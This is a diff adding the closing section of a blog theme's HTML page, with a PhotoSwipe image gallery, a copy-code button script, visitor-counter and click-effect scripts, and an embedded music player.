+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=466343434&auto=1&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
+    
+    
+
+  </div>
+</body>
+
+</html>
